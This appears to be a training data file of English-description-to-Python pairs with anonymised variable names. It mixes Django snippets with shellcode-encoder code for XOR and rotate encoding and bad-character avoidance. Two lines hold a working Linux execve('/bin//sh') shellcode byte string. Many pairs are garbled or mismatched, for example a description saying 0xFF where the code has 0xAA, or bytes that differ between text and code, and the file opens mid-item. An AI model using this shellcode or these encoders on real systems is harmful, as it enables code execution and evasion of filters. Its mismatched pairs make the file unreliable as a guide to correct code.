string '__le__',   and lambda function with 2 arguments: self and other, resulting boolean True if self is not greater than or is not equal to other,   or self is equal to other, tuple with 2 elements: string '__gt__',   and lambda function with 2 arguments: self and other, resulting boolean True if self is greater than or not equal to other,   or self is not equal to other, tuple with 2 elements: string '__lt__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is greater than or equal to other, for '__ge__',   convert cls to a dictionary, convert the result into a set and convert convert into a set, roots is a set of differences of the two previous sets. </s> roots = set ( dir ( cls ) ) & set ( convert )
+ROT is the first command-line argument converted to integer </s> ROT = int ( sys . argv [ 1 ] )
+assign rox_encoded_instruction res1 bitwise or res2 </s> var0 = var1 | var3
+append string '\\x' followed by the conversion in hex of 0xFF to the string s </s> s += '\\x%02x' % 0xAA
+set s to the string 'hello' </s> s = var0
+assign sb the hexadecimal value of leader casted into an int16 </s> sb = int ( hex ( leader ) , 16 )
+append to sc a bytes object containing the value val2 packed according to the format string unsigned char </s> sc . append ( struct . pack ( 'B' , var0 ) )
+call the function urlsplit with an argument url, assign the result to scheme, netloc, path, query and fragment, respectively. </s> scheme , var1 , path , query , fragment = var0 ( url )
+call the method shell.mainloop. </s> var0 ( )
+convert shellcode to a bytearray and store its length in the variable shell_n </s> shell_len = len ( var1 ( var0 ) )
+concatenate in the string shellcode the concatenation of '\\x' and the string byte encoded in hexadecimal </s> var0 += var1 + byte . encode ( 'hex' )
+Convert the value of x bitwise and 0xff to a hexadecimal then add it to the variable shellcode </s> var2 += '%02x' % ( x & var1 )
+remove the first 3 items from shellcode </s> var0 = var0 [ 3 : ]
+Declare a string shellcode and add the string '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' into it </s> var0 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
+assign the variable shellcode_encoded_hex the hexadecimal values of shellcode_encoded separated by the string '\\x' </s> var0 = '' . join ( '\\x{:02x}' . format ( x ) for x in var1 )
+store in the variable shellcode_encoded_nasm the hexadecimal values of shellcode_encoded separated by the string '0x' and remove any trailing ',' </s> var0 = '' . join ( '0x{:02x}, ' . format ( i ) for i in var1 ) . rstrip ( ', ' )
+append to the variable shellcode_encoded the value of shellcode_original at index i xor the variable r </s> var0 . append ( var1 [ i ] ^ r )
+append to the variable shellcode_encoded the value of shellcode_original at index i+1 xor the variable r </s> var0 . append ( var1 [ i + 1 ] ^ r )
+read the file f as a bytearray from hexadecimal values remove whitespaces and replace all occurences of the string '\\t' with ''" and store the result in shellcode_original </s> var5 = var0 . fromhex ( f . read ( ) . strip ( ) . replace ( '\\t' , '' ) )
+assign the variable shellcode_original_hex the hexadecimal values of shellcode_original separated by the string '\\x' </s> var0 = '' . join ( '\\x{:02x}' . format ( x ) for x in var1 )
+append 0x70 to shellcode </s> var0 . append ( 112 )
+shells is a list containing 2 elements: string 'ipython' and string 'bpython'. </s> shells = [ var0 , 'bpython' ]
+if value is an instance of datetime and settings.USE_TZ if use_tz is None else use_tz and call to the function is_naive, </s> should_convert = isinstance ( value , var0 ) and ( settings . var1 if var2 is var6 else var2 ) and not var7 ( value ) and getattr ( value , 'convert_to_local_time' , True )
+append string '0x' to str </s> var0 += var1
+Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable str followed by ',' </s> var2 += '%02x, ' % ( z & var1 )
+add the string value '0x' to the variable str </s> var0 += var1
+str is an empty string </s> var0 = ''
+initialize the variable str to an empty string </s> var0 = ''
+append str1 to str </s> var1 = var1 + var0
+add to str a bytes object containing the value xor_byte packed according to the format string unsigned char </s> var0 . append ( struct . pack ( 'B' , var1 ) )
+append string '0x' to str1 </s> var1 += var0
+add the string value '\\x' to the variable str1 </s> var1 += '\\x'
+str1 is a string containing the hexadecimal conversion of str </s> var0 = '%02x' % var1
+str1 is a string "" </s> var0 = ''
+add to str1 a bytes object containing the value val4 packed according to the format string unsigned char </s> var0 . append ( struct . pack ( 'B' , var1 ) )
+convert shift to hexadecimal and append it followed by ', ' to the string str4 </s> var1 += '%02x, ' % shift
+convert val2 in hexadecimal and append it followed by ', ' to the string str5 </s> var2 += '%02x, ' % var0
+substitute str for string_types. </s> var0 = str ,
+call the function allow_lazy with an argument strip_tags, substitute the result for strip_tags. </s> var1 = var0 ( var1 )
+substitute style.ERROR for style.ERROR_OUTPUT. </s> style . var0_OUTPUT = style . var0
+call the function get_commands, convert the result to a list, append string 'help' to it, substitute it for subcommands. </s> var3 = list ( var0 ( ) ) + [ var2 ]
+substitute __setitem__ filed of the base class of the class SortedDict for super_set. </s> var2 = super ( var1 , self ) . var0
+supports_microseconds is boolean False. </s> var0 = var1
+separate every 2 characters of the string swapped with the separator ", " </s> swapped = ', ' . join ( swapped [ i : i + 2 ] for i in range ( 0 , len ( swapped ) , 2 ) )
+add "0x" to every 2 characters of the string swapped </s> swapped = '0x' . join ( swapped [ i : i + 2 ] for i in range ( 0 , len ( swapped ) , 2 ) )
+convert the values of swapped to hexadecimals </s> swapped = binascii . hexlify ( bytearray ( swapped ) )
+open out_log file in append mode with buffering size of the input buffer, substitute the result for sys.stdout. </s> var1 = open ( var0 , 'a' , buffering )
+exit the program with code 0 </s> sys . exit ( 0 )
+decrement t by integer 1, </s> t -= 1
+call the method self.non_field_errors, substitute the result for top_errors. </s> var2 = self . var1 ( )
+integer 0 and integer 0.   try, </s> try:
+append to the string val the value (7 - (256 -x)) converted to hexadecimal </s> var0 += '%02x' % ( 7 - ( 256 - x ) )
+convert (x+7) to hexadecimal and append it to the string val </s> var0 += '%02x' % ( x + 7 )
+for each element in var convert the element to an integer representing the unicode then convert it to a hexadecimal ignore slice at index 2 until the end and join separating each element by the string '\\x' </s> val = '' . join ( '\\x{}' . format ( hex ( ord ( x ) ) [ 2 : ] ) for x in var )
+subtract 1 from 2 to the power of max_bits and assign the result to val1 </s> var1 = 2 ** var0 - 1
+call the function func with the argument tmp and save the return value in val1 </s> var2 = var0 ( var1 )
+assign val1 the hexadecimal value of the variable byte converted to int16  xor with the variable i </s> var1 = int ( byte . encode ( 'hex' ) , var016 ) ^ i
+call the method self.var1.resolve with 2 arguments: context and boolean True, substitute the result for val2. </s> val1 = var0 ( context , var1 )
+val2 is the result of the bitwise xor between the integer base 32 of the element i of chunk encoded to hex and xor_byte </s> var0 = int ( chunk [ i ] . encode ( 'hex' ) , 32 ) ^ var2
+call the method parser.compile_filter with an argument, third element of bits, substitute the result for val2. </s> var2 = parser . var1 ( bits [ 2 ] )
+add the string value '\\x' to the variable var </s> var += '\\x'
+Convert the variable rand to a hexadecimal and add it to the variable var </s> var += '\\x%02x' % rand
+append '0x' to var </s> var += var0
+add the bytes literal "\x0a\x1b\x2c\x3d\x4e\x5f\x6a\x10\x56\x57\x68\x99\xa5" to the variable var </s> var += b'\x0a\x1b\x2c\x3d\x4e\x5f\x6a\x10\x56\x57\x68\x99\xa5'
+add the bytes literal "\x5b\x37\x42\x01\xbd\x3c\x72\x7c\x02\x3d\x5f\xc1\xcf" to the variable var </s> var += b'\x5b\x37\x42\x01\xbd\x3c\x72\x7c\x02\x3d\x5f\xc1\xcf'
+add the bytes literal "\x90\x4a\x5c\xf3\x1e\x81\x69\x14\x75\x72\xde\xac\x77" to the variable var </s> var += b'\x90\x4a\x5c\xf3\x1e\x81\x69\x14\x75\x72\xde\xac\x77'
+add the bytes literal "\x99\xaf\xbb\xed\xbe\x46\x56\x4e\x88\x72\x53\x44\x68" to the variable var </s> var += b'\x99\xaf\xbb\xed\xbe\x46\x56\x4e\x88\x72\x53\x44\x68'
+add the bytes literal "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c" to the variable var </s> var += b'\xae\xf2\xc4\xbb\x03\x41\xcd\x8b\x52\x10\x8b\x4a\x3c'
+Convert the value of val1 to hexadecimal, then slice it between the indicies 2 and 3, convert it to an int16 and add its value to var1 </s> var1 = int ( hex ( var0 ) [ 2 : 3 ] , 16 )
+visible_issue_count is an integer 0. </s> var0 = 0
+endless loop, </s> while True : 
+while x is greater than zero, </s> while x > 0 : 
+subtract decimals from digits, substitute the result for whole_digits. </s> var0 = digits - decimals
+open writer.path file in write mode, with file descriptor as fh, perform the following, </s> with open ( var0 , 'wb' ) as var1 : 
+append to the string x the hexadecimal conversion of the and operation between a and 0xff </s> x += '%02x' % ( a & var0 )
+append to the string encoded the hexadecimal conversion of the and operation between y and 0xff </s> x += '%02x' % ( a & var0 )
+perform the and operation between y and 0xff, then convert the result in hexadecimal and append it to the string x </s> x += '%02x' % ( y & var0 )
+add 1 to x </s> x += 1
+Convert the value of y to hexadecimal, then slice it at index 3 and add its value to x </s> x += hex ( y ) [ 3 : ]
+Slice y at index 3 and add its value to x </s> x += y [ 3 : ]
+Convert the value of y to hexadecimal, then slice it at index 3 and add the value to x </s> x += y [ 3 : ]
+Convert the variable x to a hexadecimal and store it in the variable x </s> x = '%02x' % x
+initialize an empty string variable called x </s> x = ''
+store the variable x the value of the function rol with x and rand as parameters </s> x = var0 ( x , rand )
+perform a left shift on x by n, then store the result in x </s> x = x << nbits
+in x replace '\x45' with bytes object containing the value y packed according to the format string unsigned char </s> x = x . replace ( '\x45' , struct . pack ( 'B' , y ) )
+assign the variable x the value of x xor 0xDD </s> x = x ^ 221
+assign xor_byte the value of the function find_valid_xor_byte with chunk and bad_chars as parameters </s> var0 = var1 ( chunk , var3 )
+Take the absolute value of subfs then convert subfs to an integer, then cast to a hexadecimal, slice the variable rev_suplx between the indicies 0 and 2 then cast rev_suplx to the type int32, store the value of the summation in the variable xxx </s> xxx = hex ( int ( abs ( var0 ) ) + int ( var2 [ 0 : 2 ] , 32 ) )
+Convert the variable x to a hexadecimal and store it in the variable y </s> y += '%02x' % x
+append the value x converted in hex to the string y </s> y += '%02x' % x
+assign the variable y the bytearray of the variable shellcode at index 0 bitwise xor bytearray of shellcode at index 1 </s> y = var0 ( var2 ) [ 0 ] ^ var0 ( var2 ) [ 1 ]
+assign the variable y to x bitwise xor the bytearray of shellcode at index n </s> y = x ^ var1 ( var2 ) [ n ]
+Convert the variable x to a hexadecimal and add it to the variable z followed by ',' </s> z += '%02x, ' % x
+append the value y converted to hex to the string z </s> z += '%02x' % y
+zbuf is an instance of BytesIO class. </s> var0 = var1 ( )
+convert to hexadecimal random integer between 1 and 100 and append it to string a </s> a += '\\x%02x' % random . randint ( 1 , 100 )
+append string var0 to a </s> a += var0
+increment by 1 </s> a += 1
+cast to var0 </s> a = int ( hopcode , 16 )
+var0 is var2 of ba1 </s> var0 = bytearray ( var0 )
+call var0 with argument var1 substitute it for var2  </s> var2 = var0 ( var1 )
+bad_app_labels is empty set. </s> bad_app_labels = set ( )
+break loop execution. </s> break
+break from loop execution. </s> break
+breaks from smallest enclosing loop. </s> break
+skip var0 loop iteration. </s> break
+break from loop execution </s> break
+read one line from self file stream, substitute result for var0  </s> var0 = self . readline ( )
+var0 is instance of var1 class. </s> var0 = var1 ( )
+substitute line for var0  </s> var0 = line
+var0 is dict with 3 initial entries: boolean True for var1, boolean False for var4 and None for var7. </s> var0 = { var1 : True , 'False' : False , 'None' : None }
+call te method var0 with argument integer 0, substitute result for var1  </s> var1 = var0 ( 0 )
+convert bytes to floating point number, substitute it for bytes. </s> bytes = float ( bytes )
+c is sum of and b var0 100 </s> c = ( a + b ) % 100
+call var0 with length of var1 subtracted from size as argument, store result into chunk. </s> chunk = self . _read_limited ( size - len ( var1 ) )
+call method var0 with argument var1 substitute result for chunk. </s> chunk = var0 ( var1 )
+substitute length of chunk for var0  </s> var0 = len ( chunk )
+double chunk size. </s> chunk_size *= 2
+call function var0 with 2 arguments: var1 and var3 substitute result for count and var1 respectively. </s> count , var1 = var0 ( var1 , var3 )
+call var0 function with argument integer 1, substitute result for count. </s> count = var0 ( 1 )
+multiply seconds by count, subtract it from var0 divide result by var1 store floored result in var2  </s> var2 = ( var0 - seconds * count ) // var1
+define variable named counter and assign 0 to it </s> counter = 0
+add string value var0 to variable d </s> d += var0
+append e to debugs list for every e in var0 if var2 is lesser var3 checks var4 and result of method e var6 in false. </s> debugs = [ e for e in var0 if var2 < checks . var4 and not e . var6 ( ) ]
+substitute first var0 elements of var1 for var1  </s> var1 = var1 [ : var0 ]
+update var0 dict with entry base var0  </s> var0 . update ( base . var0 )
+var0 is instance of var1 class. </s> var0 = var1 ( )
+call function curry with 2 arguments: var0 and method set to var1 substitute result for decode. </s> decode = curry ( var0 , method = var1 )
+s and var0 set to var0 use it as argument for var4 function, substitute result for var6 decompress is boolean var8  </s> decompress = var8
+called with with argument lambda function var0 returns result of var1 function called with argument text var3 define method var4 with 3 arguments: self, text and truncate set to var6  </s> def var4 ( self , text , truncate = var6 ) : 
+define method named add with parameters a, b and var0 C has default value of 3 </s> def add ( a , b , c = 3 ) : 
+define function var0 with argument loader. </s> def var0 ( loader ) : 
+define function first with argument value. </s> def first ( value ) : 
+define method named var0 with parameters n,x, and var1 Y has default value of 1 </s> def var0 ( n , x , y = 1 ) : 
+define function var0 with argument var1 </s> def var0 ( s ) : 
+define function media with argument request. </s> def media ( request ) : 
+define function var1 with 3 arguments var0 path and var2  </s> def var1 ( var0 , path , var2 ) : 
+define method var0 with argument self. </s> def var0 ( self ) : 
+define method named routine var0 takes in n as parameter </s> def routine ( n ) : 
+define method var0 with argument self. </s> def var0 ( self ) : 
+else if name is equal to string var0 </s> elif name == var0:
+otherwise if fourth element of version does not equals to var0, </s> elif version [3]!= var0:
+if not, </s> else:
+to function var0 called with argument seconds as negative var1 return result var2 if not, </s> else:
+var0 is list with element var0  </s> var0 = [ var0 ]
+EMPTY_VALUES is tuple containing 5 initial elements: var0 empty string, empty list, empty tuple and empty dict. </s> EMPTY_VALUES = var0 , '' , [ ] , ( ) , { }
+put elements of var0 var1 to list, substitute result for var2  </s> var2 = list ( var0 . var1 )
+call function curry with 2 arguments: var0 and method set to six var2 encode, substitute result for encode. </s> encode = curry ( var0 , method = six . var2 . encode )
+encode is lambda function with arguments k and v, return value is string var0 var1 var2 is replaced with: </s> encode = lambda k , v : var0 % ( quote ( k , safe ) , quote ( v , safe ) )
+add string value var0 to variable encoded </s> encoded += ', '
+add string value var0 to variable encoded </s> encoded += '\\y'
+Convert value of j to hexadecimal then add it to variable encoded followed by string var0 </s> encoded += '%02x, ' % j
+Convert value of y var0 and var1 to hexadecimal then add it to variable encoded followed by string var2 </s> encoded += '%02x, ' % ( y & var1 )
+Convert value of x to hexadecimal then add it to variable encoded followed by string var0 </s> encoded += '%02x, ' % x
+Convert variable x to hexadecimal var0 result with string var1 add result to variable encoded </s> encoded += '%02x, ' % x
+convert value x to hex, concatenate result with var0 and append it to string encoded </s> encoded += '%02x, ' % x
+convert (7 -(256 - x)) to hexadecimal, concatenate result with string var0 and append it to string encoded </s> encoded += '%02x, ' % ( 7 - ( 256 - x ) )
+Convert value of h var0 and var1 to hexadecimal, concatenate result with string var2 and then add it to variable encoded </s> encoded += '%02x, ' % ( h & var1 )
+convert (x+7) to hexadecimal, concatenate result with string var0 and append it to string encoded </s> encoded += '%02x, ' % ( x + 7 )
+Convert value of y to hexadecimal, concatenate result with string var0 and then add it to variable encoded </s> encoded += '%02x, ' % y
+convert value x to hex and append it to string encoded </s> encoded += '%02x' % x
+concatenate string var0 with hexadecimal conversion of var1 and append result to string encoded </s> encoded += '0x%02x, ' % var1
+concatenate string var0 with hexadecimal conversion of rand and append result to string encoded </s> encoded += '0x%02x, ' % rand
+set encoded to string var0 </s> encoded = var0
+encoded is concatenation of string var0 with hexadecimal conversion of var1 of array of bytes of var2 </s> encoded = '0x%02x, ' % len ( bytearray ( var2 ) )
+convert value z to hex and append it to string var0 </s> var0 += '%02x' % z
+Convert value of leader to hexadecimal, then slice it at index of 2 and add its value to variable var0 </s> var0 += hex ( leader ) [ 2 : ]
+call method var0 var2 with argument attachment. </s> var0 . var2 ( attachment )
+substitute string var0 for encoding. </s> encoding = var0
+if encoding does not exists substitute it for settings var0  </s> encoding = encoding or settings . var0
+substitute elements of tuple boundary to end and next, respectively. </s> end , next = boundary
+es is var0 of byte string var1 </s> es = bytearray ( b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80' )
+if var0 exception is caught, </s> except var0:
+if var0 as e exception is raised, </s> except var0 as e:
+except </s> except:
+executor is instance of class var0 created with argument: value under var1 key of connections dict. </s> executor = var0 ( connections [ var1 ] )
+substitute var0 for var1 and var3 respectively var5 executor is instance of var6 created with value under var7 key of connections dict. </s> executor = var6 ( connections [ var7 ] )
+call function exhaust with argument var0  </s> exhaust ( var0 )
+call function exhaust with argument var0  </s> exhaust ( var0 )
+call function var0 with os var1 var2 var3 and var4 as arguments, substitute result for var6  </s> var6 = var0 ( os . var1 , var2 , var3 , var4 )
+call function var0 substitute return value for var1  </s> var1 = var0 ( )
+terminate program with exit code 4 </s> exit ( 4 )
+terminate program with exit code 5 </s> exit ( 5 )
+on object under db key of connections dict call method ops var1 with argument var2 substitute result for var2  </s> var2 = connections [ db ] . ops . var1 ( var2 )
+call function var0 with argument var1 substitute it for var2  </s> var2 = var0 ( var1 )
+call method var0 var2 with argument var3 substitute it for failures. </s> failures = var0 . var2 ( var3 )
+FASTCGI_OPTIONS is dict containing 16 initial entries: var0 for var1 var2 for var4 var2 for var5, </s> FASTCGI_OPTIONS = { 'protocol' : var0 , 'host' : var2 , 'port' : var2 , 'socket' : var2 , 'method' : 'fork' , 'daemonize' : var2 , 'workdir' : '/' , 'pidfile' : var2 , 'maxspare' : 5 , 'minspare' : 2 , 'maxchildren' : 50 , 'maxrequests' : 0 , 'debug' : var2 , 'outlog' : var2 , 'errlog' : var2 , 'umask' : var2 }
+var0 set to var3 as arguments var4 call method var5 with suffix set to suffix, prefix set to prefix and var0 set to var0 store result in var6 and name, respective. </s> var6 , name = tempfile . mkstemp ( suffix = suffix , prefix = prefix , var0 = var0 )
+join base unpacked list paths into string, get absolute path in var0 representation of result, substitute result for var1  </s> var1 = abspathu ( join ( base , * paths ) )
+finally perform, </s> finally:
+call method var0 finditer with argument text, for every bit in result, </s> for bit in var0 . finditer ( text ) : 
+split var0 by self var2 separator, for every bit in result, </s> for bit in var0 . split ( self . var2 ) : 
+iterate over bytes in array </s> for byte in array : 
+iterate bytes in list var0 </s> for byte in var0 : 
+iterate byte in list var0 </s> for byte in var0 : 
+iterate byte in var0 </s> for byte in var0 : 
+iterate over bytes in var0 </s> for byte in var0_
+for every bytes in stream, </s> for bytes in stream : 
+for every c in var0 dict value under var1 key, </s> for c in var0 [ var1 ] : 
+for every var0 and escaped in var1  </s> for var0 , escaped in var1 : 
+for every var0 in var1  </s> for var0 in var1 : 
+for every char in var0  </s> for char in var0 : 
+iterate char over var0 </s> for char in var0 : 
+for every i and widget in enumerated var0 var1  </s> for i , widget in enumerate ( var1 ) : 
+for every i and word in enumerated var0 words, </s> for i , word in enumerate ( words ) : 
+loop through var0 converted into var1 </s> for i in var1 ( var0 ) : 
+Make for loop for each i in var0 of var1 </s> for i in var0 ( var1 ) : 
+declare for loop with var0 i for each element in var1 starting from index 4 converted into var2 </s> for i in var2 ( var1 ) [ 4 : ] : 
+iterate i in var0 </s> for i in var0 : 
+iterate i over 200 random numbers between 1 and 256 </s> for i in random . sample ( range ( 1 , 256 ) , 200 ) : 
+for every i in range of integers from integer 0 to length of pieces var0 by one, with step of integer 3, </s> for i in range ( 0 , len ( pieces ) - 1 , 3 ) : 
+call method self var1 for every i in sequence of integers, from 0 to previous result, </s> for i in range ( 0 , self . var1 ( ) ) : 
+for every i in range of integers from 0 to length of result, not included, </s> for i in range ( len ( result ) ) : 
+iterate i over sequence of number from 0 to 5 </s> for i in range ( 0 , 5 ) : 
+initialize for loop with var0 i with range starting from 0 var1 length of var2 with step of 8 </s> for i in range ( 0 , len ( var2 ) , 8 ) : 
+initialize for loop with var0 i with range starting from 0 var1 value of stop </s> for i in range ( 0 , stop ) : 
+loop over var0 </s> for i in var0 : 
+zip elements of var0 and var1 into list of var3 for every var4 and var6 in result, </s> for var4 , var6 in zip ( var0 , var1 ) : 
+for every index in range of integers from 0 to length of var0 not included, </s> for index in range ( len ( var0 ) ) : 
+for every j in range of integers from 0 to iterations converted to integer, </s> for j in xrange ( int ( iterations ) ) : 
+for every x in var0  </s> for x in var0 : 
+Make for loop for each x in var0 of var1 </s> for x in var0 ( var1 ) : 
+loop through var0 converted into var1 </s> for x in var1 ( var0 ) : 
+loop x over var0 of string var1 </s> for x in var0 ( var1 ) : 
+for every x is range of integers from level to integer 2, in reversed order, </s> for x in range ( level , 1 , - 1 ) : 
+substitute var0 for var1  </s> var1 = var0
+get value under var0 key of options dict, substitute result for format. </s> format = options . get ( var0 )
+append var0 and string var2 to variable var3 </s> var3 += var0 + ', '
+initialize var0 to empty string </s> var0 = ''
+format key is empty string. </s> format_key = ''
+var0 is empty string var1 </s> var0 = ''
+substitute second element of bits var0 first and last element for var1  </s> var1 = bits [ 1 ] [ 1 : - 1 ]
+call function var0 with 3 arguments: raw string var1 var2 and var4 var5 first and last element, </s> guts = var0 ( '\\\\.|.' , var2 , var4 [ 1 : - 1 ] )
+h is sum of y and x var0 256 </s> h = ( y + x ) % 256
+substitute self var1 for var1  </s> var1 = self . var1
+call function digest, substitute filed var0 of result for var1  </s> var1 = digest ( ) . var0
+if return value of self var1 is false and server port is not equal to string var2 var3 join host and var4 into string, separated with var6, substitute result for host. </s> host = '%s:%s' % ( host , var4 )
+result of function var0 called with argument title, and with var1 append string to output var2 increment i by 1. </s> i += 1
+increment i by 1 </s> i += 1
+add 1 to variable i </s> i += 1
+i is integer 0. </s> i = 0
+substitute var0 for var1 </s> i = var0
+initialize i as integer </s> i = 0
+var0 is integer 2 </s> var0 = 2
+if character var0 is contained in x, </s> if var0 in x : 
+if string var0 is in var1 </s> if '0x1, ' in var1 : 
+if string var0 is contained in options, </s> if var0 in options : 
+strings var0, var0 and self var4 var8 var9 is replaced with self var4 and code as string var10 var6 if self var14 is true, and length of self var16 subtracted from return value of method self var18  </s> if ( self . var14 and self . var18 ( ) - len ( self . var16 ) < self . min_num ) : 
+check if length of variable is not even </s> if ( len ( a ) % 2 ) != 0 : 
+check if variable r xor var0 at index i is not equal to 0 and r var4 xor var0 at index var7 does not equal 0 and r var4 xor var0 at index var8 does not equal 0 and r var4 xor var0 at index var9 does not equal 0 </s> if ( r ^ var0 [ i ] != 0 ) and ( r ^ var0 [ i + 1 ] != 0 ) and ( r ^ var0 [ i + 2 ] != 0 ) and ( r ^ var0 [ i + 3 ] != 0 ) : 
+if response var2 is lesser var4 integer 200 and grater or equal var4 100, or response var2 equals to integer 204 or 304, </s> if 100 <= response . var2 < 200 or response . var2 in ( 204 , 304 ) : 
+check if variable is less var0 value of 1 </s> if a < 1 : 
+if var0 equals var2, </s> if var0 == var2 : 
+if changes is true, </s> if changes : 
+if cookie is empty string, </s> if cookie == '' : 
+if count does not equals to integer 0, </s> if count != 0 : 
+if count var0 2 is not equal to zero </s> if count % 2 != 0 : 
+if var0 does not equals to integer 0, </s> if var0 != 0 : 
+if counter var0 3 is equal to 0 </s> if counter % 3 == 0 : 
+if not var0 is var4 if var0 is true, </s> if var0 : 
+bring integer 36 to power of factor, if i is smaller var0 result, </s> if i < 36 ** factor : 
+if variable i is lower var0 length of chunk </s> if i < len ( chunk ) : 
+if i equals to integer 0 and </s> if i == 0 and not is_writable ( npath ( base_path + '.mo' ) ) : 
+convert to integer base 16 string var0 encoded to hex and check if it is equal to i </s> if i == int ( var0 . encode ( 'hex' ) , 16 ) : 
+if length of x is equal to integer 0, </s> if len ( x ) == 0 : 
+if var0 is smaller var1 integer 1, </s> if var0 < 1 : 
+if length of var0 is not equal to 3 </s> if len ( var0 ) != 3 : 
+if number of command-line arguments is lower var1 10 </s> if len ( sys . argv ) < 10 : 
+Check if length of x is greater var0 4 </s> if len ( x ) > 4 : 
+if length of z is not var0 by 4 </s> if len ( z ) % 4 != 0 : 
+if level is true, </s> if level : 
+check if var0 is var2 </s> if var0 : 
+if var0 is different var1 value of dict var2 under key filename, </s> if var0 != var2 [ filename ] : 
+if match is false or call to method var0 with argument integer 1 evaluates to boolean false, </s> if not match or not var0 ( 1 ) : 
+check if var0 is not var2 </s> if not var0 : 
+if var0 starts with string '^', </s> if var0 . startswith ( '^' ) : 
+check if variable padding does not equal 0 </s> if padding : 
+if role is contained in value under var0 key of var1 dict and definition is true, </s> if role in var1 [ var0 ] and definition : 
+if root is true, </s> if root : 
+call method router var1 with 2 arguments: var2 and var3 if it evaluates to true, </s> if router . var1 ( var2 , var3 ) : 
+if fifth and sixth elements of row are var0  </s> if row [ 4 ] is var0 or row [ 5 ] is var0 : 
+on result call method encode with arguments encoding and errors, return result var0 if var1 and boolean return value of call to function var3 for argument s are boolean var5  </s> if var1 and var3 ( s ) : 
+check if bytes object containing var0 packed according to format string unsigned char is equal to variable z </s> if struct . pack ( 'B' , var0 ^ i ) == z : 
+if var0 is true, </s> if var0 : 
+if total is not equivalent to 2 </s> if total != 2 : 
+if var0 is true, </s> if var0 : 
+if words is not empty and length is smaller var0 or equal to integer 0, </s> if words and length <= 0 : 
+if x equals to integer 0, </s> if x == 0 : 
+check if x is equal to element n in var0 converted into var1 </s> if x == var1 ( var0 ) [ n ] : 
+check if xxx is greater or equals to 0 </s> if xxx >= 0 : 
+if y, m and d are all equal to string var0, </s> if y == m == d == var0 : 
+if z is equal to byte </s> if z == byte : 
+convert string byte to hex, then cast result to var0 and then check if it is equal to variable z </s> if z == int ( byte . encode ( 'hex' ) , 16 ) : 
+import module var0  </s> import var0t
+import module var0  </s> import var0
+import module var0  </s> import var0
+import module var0  </s> import var0
+import module var0  </s> import var0
+inputs is empty list. </s> inputs = [ ]
+substitute complain for insert. </s> insert = complain
+generate random integer between 1 and 2 then convert random number into hexadecimal and store value in var0 </s> var0 = hex ( random . randint ( 1 , 2 ) )
+and unpacked dict var0 instance var3 is empty list. </s> instance . var3 = [ ]
+substitute var0 for var1  </s> var1 = var0
+compute sum of i and magic modulus 256 and store in variable j </s> j = ( i + magic ) % 256
+bring integer 36 to power of factor, substitute result for var0 </s> j = 36 ** factor
+call function escape with argument lead, substitute result for lead, call function escape with argument trail, </s> lead , trail = escape ( lead ) , escape ( trail )
+sum lead and opening, substitute result for lead. </s> lead = lead + opening
+set leader to second command-line argument after casting it to var0 </s> leader = var0 ( sys . argv [ 2 ] )
+substitute length of values for var0  </s> var0 = len ( values )
+print length of array of bytes of string var </s> len(bytearray(var)))
+substitute var0 converted into integer for length. </s> length = int ( var0 )
+store in variable var0 number of var4 var5 in var2 </s> var0 = var2 . count ( ', ' )
+increment level by one. </s> level += 1
+Declare empty bytes literal and store it in variable lit </s> lit = b''
+var0 is lambda function with value as argument, return value is result of method value var2  </s> var0 = lambda value : value . var2 ( )
+match is boolean var0  </s> match = var0
+matches is boolean var0  </s> matches = var0
+multiply var0 with integer 86400 add to result var1 if result is greater var2 integer 0, </s> max_age = max ( 0 , var0 * 86400 + var1 )
+var0 variable var1 to integer with value of 8 </s> var1 = 8
+call var0 function, store result in var1  </s> var1 = var0 ( )
+n is equal to n var0 and masked width </s> n &= mask ( width )
+Convert value of y to hexadecimal then add it to variable n </s> n += '%02x' % y
+increase n by 1 </s> n += 1
+get attribute var0 from var1 if it exists substitute it for m, if not, m is var2  </s> n = var1 ( lookup_view , var0 , var2 )
+convert var0 to integer, substitute it or var1 </s> n = int ( var0 )
+initialize empty string variable called name </s> name = ''
+in variable encoded replace all occurrences of var0 with var1 </s> nasm = encoded . replace ( '\\x' , ',var2' )
+set variable var0 to all elements in variable var0 starting from index 1 var2 end </s> var0 = var0 [ 1 : ]
+call value var1 method, substitute result for natural. </s> natural = value . var1 ( )
+call method obj var1 substitute result for var1  </s> var1 = obj . var1 ( )
+set variable var0 to second command-line argument converted to integer </s> var0 = int ( sys . argv [ 2 ] )
+append var0 to string var2, substitute it for new. </s> new = var2 + var0
+set variable new to not i var0 and var1 </s> new = ~ i & var1
+set new to new xor variable xor </s> new = new ^ xor
+set new to new shifted left by shift </s> new = new << shift
+var0 is string var1. </s> var0 = var1
+set var0 to empty list </s> var0 = [ ]
+call method var0 substitute result for var1  </s> var1 = var0 ( )
+append i to variable var0 </s> var0 . append ( i )
+join var0 and sting var1 into file path name, substitute it for var2  </s> var2 = os . path . join ( var0 , var1 )
+convert value x to hexadecimal and append it to string var0 followed by string var2 </s> var0 += '%02x, ' % x
+close process with argument 0. </s> os . _exit ( 0 )
+exit program with code integer 1. </s> os . _exit ( 1 )
+feed data to parser var0 </s> var0feed ( data )
+P is string var0 </s> P = '\x1b35m'
+calculate negative length of s, by modulus integer 4, use result as number of var0 characters to be stored in pad. </s> pad = bvar0 * ( - len ( s ) % 4 )
+assign variable padding 4 minus length of var0 modulus 4 </s> padding = 4 - len ( var0 ) % 4
+remove 3 elements from r starting at index 23. </s> r = r [ : 23 ] + r [ 26 : ]
+set variable r to random integer between 10 and 255 </s> r = random . randint ( 10 , 255 )
+raise exception. </s> raise
+var0 is instance of object class. </s> var0 = object ( )
+random is instance of random var0 class. </s> random = random . var0 ( )
+assign first two elements of var0 to res </s> res = var0 [ 0 : 2 ]
+increment res by element of var0 at digit index. </s> res = var0s [ digit ] + res
+res is x xor y </s> res = x ^ y
+right shift by var0 and operation between z and var1 and assign it to var2 </s> var2 = ( z & var1 ) >> var0
+perform and operation between x shifted right by var0 and var1 and assign result to var2 </s> var2 = x >> var0 & var1
+assign variable var0 variable x var1 and var2 </s> var0 = x & var2
